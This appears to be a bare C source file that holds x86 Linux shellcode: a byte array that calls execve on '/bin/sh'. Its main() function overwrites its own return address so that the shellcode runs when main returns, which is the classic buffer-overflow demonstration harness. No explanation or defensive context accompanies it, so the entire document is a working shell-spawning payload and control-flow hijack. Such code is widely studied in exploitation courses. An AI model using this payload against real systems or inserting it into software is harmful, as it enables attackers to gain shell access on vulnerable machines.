char shellcode[] = 
"\xEB\x1A\x5E\x31\xC0\x88\x46\x07\x8D\x1E\x89\x5E\x08\x89\x46"
"\x0C\xB0\x0B\x89\xF3\x8D\x4E\x08\x8D\x56\x0C\xCD\x80\xE8\xE1"
"\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68";

int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}
